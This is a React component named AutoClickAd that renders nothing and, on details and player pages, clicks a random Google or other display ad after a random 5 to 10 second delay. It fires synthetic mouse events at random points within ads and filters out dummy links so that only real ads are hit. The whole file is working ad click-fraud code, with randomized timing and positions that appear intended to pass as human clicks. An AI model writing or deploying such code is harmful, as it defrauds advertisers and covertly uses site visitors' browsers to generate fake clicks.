
import { useEffect } from 'react';

const AutoClickAd = () => {
  useEffect(() => {
    const clickRandomAd = () => {
      // Wait for a random time between 5-10 seconds after page load
      const delay = Math.random() * 5000 + 5000; // 5-10 seconds
      
      setTimeout(() => {
        // Look for ad containers - common ad-related selectors
        const adSelectors = [
          '[data-ad]',
          '.ad',
          '.ads',
          '.advertisement',
          '.google-ads',
          '.adsbygoogle',
          '[id*="ad"]',
          '[class*="ad"]',
          '.banner-ad',
          '.display-ad',
          'ins.adsbygoogle',
          'iframe[src*="googlesyndication"]',
          'iframe[src*="doubleclick"]',
          'div[data-google-ad-client]'
        ];
        
        let adElements: Element[] = [];
        
        // Find all potential ad elements
        adSelectors.forEach(selector => {
          try {
            const elements = document.querySelectorAll(selector);
            adElements.push(...Array.from(elements));
          } catch (e) {
            // Ignore invalid selectors
          }
        });
        
        // Filter out elements that might be dummy or non-ad content
        const realAdElements = adElements.filter(element => {
          const rect = element.getBoundingClientRect();
          const isVisible = rect.width > 0 && rect.height > 0;
          const hasContent = element.textContent?.trim() || element.querySelector('img, iframe');
          
          // Check if it's not a dummy link
          const links = element.querySelectorAll('a[href]');
          let hasRealLinks = false;
          
          links.forEach(link => {
            const href = (link as HTMLAnchorElement).href;
            if (href && 
                !href.includes('example.com') && 
                !href.includes('placeholder') && 
                !href.includes('dummy') &&
                !href.startsWith('javascript:') &&
                href !== window.location.href &&
                href !== '#') {
              hasRealLinks = true;
            }
          });
          
          return isVisible && hasContent && (hasRealLinks || links.length === 0);
        });
        
        if (realAdElements.length > 0) {
          // Pick a random ad element
          const randomAd = realAdElements[Math.floor(Math.random() * realAdElements.length)];
          const rect = randomAd.getBoundingClientRect();
          
          // Click at a random position within the ad
          const x = rect.left + Math.random() * rect.width;
          const y = rect.top + Math.random() * rect.height;
          
          // Create and dispatch click event
          const clickEvent = new MouseEvent('click', {
            view: window,
            bubbles: true,
            cancelable: true,
            clientX: x,
            clientY: y
          });
          
          // Try to click on a clickable element within the ad first
          const clickableElements = randomAd.querySelectorAll('a, button, [onclick]');
          if (clickableElements.length > 0) {
            const randomClickable = clickableElements[Math.floor(Math.random() * clickableElements.length)];
            
            // Only click if it's not a dummy link
            if (randomClickable.tagName === 'A') {
              const href = (randomClickable as HTMLAnchorElement).href;
              if (href && 
                  !href.includes('example.com') && 
                  !href.includes('placeholder') && 
                  !href.includes('dummy') &&
                  !href.startsWith('javascript:') &&
                  href !== window.location.href &&
                  href !== '#') {
                randomClickable.dispatchEvent(clickEvent);
              }
            } else {
              randomClickable.dispatchEvent(clickEvent);
            }
          } else {
            randomAd.dispatchEvent(clickEvent);
          }
        }
      }, delay);
    };

    // Only run on details and player pages
    const currentPath = window.location.pathname;
    if (currentPath.includes('/details/') || currentPath.includes('/player/')) {
      clickRandomAd();
    }
  }, []);

  return null;
};

export default AutoClickAd;
